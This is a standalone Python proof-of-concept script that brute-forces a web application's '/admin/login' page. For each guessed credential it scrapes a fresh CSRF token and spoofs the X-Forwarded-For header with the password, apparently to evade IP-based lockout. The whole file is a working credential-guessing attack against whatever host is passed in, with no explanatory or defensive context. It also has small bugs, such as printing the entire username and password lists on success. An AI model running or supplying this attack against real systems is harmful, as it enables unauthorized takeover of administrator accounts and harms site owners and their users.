#!/usr/bin/env python3
import re
import requests
import sys

if len(sys.argv) != 4:
    print("USAGE: poc.py host userList passwordList")
    exit()

host = sys.argv[1]
login_url = host + '/admin/login'
usernames = sys.argv[2]
passwords = sys.argv[3]

with open(usernames) as u:
    users = u.read().splitlines()

with open(passwords) as p:
    pwds = p.read().splitlines()

for user in users:
    for pwd in pwds:
        session = requests.Session()
        login_page = session.get(login_url)
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

        print('[*] Trying: ' + user + ', ' + pwd)

        headers = {
            'X-Forwarded-For': pwd,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': login_url
        }

        data = {
            'tokenCSRF': csrf_token,
            'username': user,
            'password': pwd,
            'save': ''
        }

        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
	#print(login_result, data)

        if 'location' in login_result.headers:
            if '/admin/dashboard' in login_result.headers['location']:
                print()
                print('SUCCESS: Password found!')
                print('Use {u}:{p} to login.'.format(u = users, p = pwds))
                print()
                break